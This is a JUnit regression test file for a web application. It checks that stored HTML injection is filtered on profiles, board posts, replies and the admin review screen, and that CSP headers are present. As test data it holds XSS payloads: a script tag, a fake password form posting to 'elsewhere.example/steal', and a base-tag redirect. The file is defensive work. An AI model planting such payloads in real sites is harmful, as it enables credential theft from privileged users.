package io.hearth.web;

import io.hearth.testkit.Browser;
import io.hearth.testkit.Configs;
import io.hearth.testkit.TestServer;
import org.junit.After;
import org.junit.Before;
import org.junit.Test;

import java.util.Map;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertTrue;

/**
 * Stored HTML injection, from the outside -- the worst thing this project has shipped, closed.
 *
 * The path that mattered was never a clever one. A member writes a script tag in the box on their
 * own page, and an administrator opens the review screen to decide whether to let them in: the
 * reviewer is the most privileged reader on the server, the page is one they are obliged to visit,
 * and the author is by definition somebody nobody has vouched for yet.
 *
 * Every assertion here goes through HTTP, because the thing being tested is what lands in a
 * browser. Testing the renderer would only prove the renderer is called.
 */
public class InjectionTests {
  private static final String PAYLOAD = "<script>alert(1)</script>";

  private Configs configs;
  private TestServer server;
  private Browser admin;

  @Before
  public void setUp() throws Exception {
    configs = Configs.dir().domain("example.org",
        "{\"name\":\"Example\",\"admin_emails\":[\"boss@example.com\"],"
            + "\"board\":{\"enabled\":true}}");
    server = TestServer.ofConfigs(configs.file());
    admin = signIn("boss@example.com");
  }

  @After
  public void tearDown() {
    if (server != null) {
      server.close();
    }
    if (configs != null) {
      configs.delete();
    }
  }

  @Test
  public void aProfileCannotPutAScriptOnTheReviewersScreen() throws Exception {
    Browser newcomer = signIn("newcomer@example.com");
    newcomer.submitToAndFollow("/self",
        Map.of("action", "profile", "display_name", "Newcomer", "about", "Hi. " + PAYLOAD));

    long id = server.auth.forDomain("example.org").users.byEmail("newcomer@example.com").id();
    Browser.Page review = admin.get("/admin/people/review/" + id);
    assertEquals(200, review.status());
    assertFalse("the reviewer is the most privileged reader on the server",
        review.contains(PAYLOAD));
    assertTrue("and what they actually wrote is still readable", review.contains("Hi."));
  }

  @Test
  public void aProfileCannotPutAScriptOnItsOwnPage() throws Exception {
    Browser newcomer = signIn("newcomer@example.com");
    newcomer.submitToAndFollow("/self",
        Map.of("action", "profile", "display_name", "Newcomer", "about", PAYLOAD));
    assertFalse(newcomer.get("/self").contains(PAYLOAD));
  }

  @Test
  public void aPostAndACommentAreBothFiltered() throws Exception {
    Browser member = approved("member@example.com");
    member.get("/board");
    Browser.Page posted = member.submitTo("/board",
        Map.of("action", "post", "title", "Hello", "body", "Look at this " + PAYLOAD));
    long postId = Long.parseLong(posted.location().substring("/board/".length()));
    assertFalse(member.get("/board").contains(PAYLOAD));

    member.get("/board/" + postId);
    member.submitToAndFollow("/board/" + postId, Map.of("action", "reply",
        "post", Long.toString(postId), "body", "And this " + PAYLOAD));
    Browser.Page thread = member.get("/board/" + postId);
    assertFalse("a cached thread is still a filtered thread", thread.contains(PAYLOAD));
    assertTrue(thread.contains("And this"));
  }

  @Test
  public void anInjectedFormCannotPostSomewhereElse() throws Exception {
    Browser newcomer = signIn("newcomer@example.com");
    newcomer.submitToAndFollow("/self", Map.of("action", "profile", "display_name", "N",
        "about", "<form action=\"https://elsewhere.example/steal\">"
            + "<input name=\"password\" type=\"password\"><button>Sign in again</button></form>"));

    long id = server.auth.forDomain("example.org").users.byEmail("newcomer@example.com").id();
    Browser.Page review = admin.get("/admin/people/review/" + id);
    assertFalse(review.contains("elsewhere.example"));
    assertFalse(review.contains("type=\"password\""));
  }

  @Test
  public void aBaseTagCannotRepointEveryRelativeUrlOnThePage() throws Exception {
    Browser newcomer = signIn("newcomer@example.com");
    newcomer.submitToAndFollow("/self", Map.of("action", "profile", "display_name", "N",
        "about", "<base href=\"https://elsewhere.example/\">"));
    long id = server.auth.forDomain("example.org").users.byEmail("newcomer@example.com").id();
    assertFalse(admin.get("/admin/people/review/" + id).contains("<base"));
  }

  @Test
  public void thePolicyStillSaysNoEvenThoughTheFilterAlreadyDid() throws Exception {
    // defence in depth, and worth asserting: the filter is the fix, and the policy is what covers
    // the next place somebody renders untrusted markdown and forgets which renderer to use
    Browser.Page page = admin.get("/admin");
    assertTrue(page.csp().contains("form-action 'self'"));
    assertTrue(page.csp().contains("base-uri 'self'"));
    assertTrue("inline is by nonce, never by 'unsafe-inline'",
        page.csp().contains("script-src 'self' 'nonce-"));
  }

  @Test
  public void anOperatorsOwnPageIsStillTheirs() throws Exception {
    // the boundary is who is holding the pen. An admin can already replace the whole document.
    admin.submitToAndFollow("/admin/content", Map.of("action", "save", "kind", "markdown",
        "template_name", "", "published", "on", "uri", "/about", "title", "About",
        "body", "<div class=\"fancy\">hand written</div>"));
    assertTrue(admin.get("/about").contains("<div class=\"fancy\">"));
  }

  private Browser approved(String email) throws Exception {
    Browser browser = signIn(email);
    long id = server.auth.forDomain("example.org").users.byEmail(email).id();
    admin.submitToAndFollow("/admin/people",
        Map.of("action", "approve", "user", Long.toString(id)));
    return browser;
  }

  private Browser signIn(String email) throws Exception {
    Browser browser = new Browser(server.port, "example.org");
    browser.get("/register");
    browser.submit(Map.of("email", email));
    browser.submit(Map.of("code", server.mail().lastCodeFor(email)));
    return browser;
  }
}
